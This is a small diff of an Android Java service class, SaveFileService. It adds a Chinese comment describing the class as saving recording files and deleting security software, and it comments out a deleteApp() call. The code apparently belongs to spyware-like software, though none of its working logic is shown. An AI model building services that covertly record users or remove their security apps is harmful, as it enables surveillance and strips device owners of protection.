@@ -13,7 +13,7 @@ import com.jiec.utils.FTPClientUtils;
 import com.jiec.utils.ShellUtils;
 
 /**
- * 描述:
+ * 描述:保存录音文件、删除安全软件的服务类
  * 
  * @author jiec
  * @since 2014-10-13 上午11:07:35
@@ -30,7 +30,7 @@ public class SaveFileService extends Service {
                 Log.e("test", "testService going");
 
             } else if (msg.what == 1) {
-                deleteApp();
+                // deleteApp();
             }
         };
     };
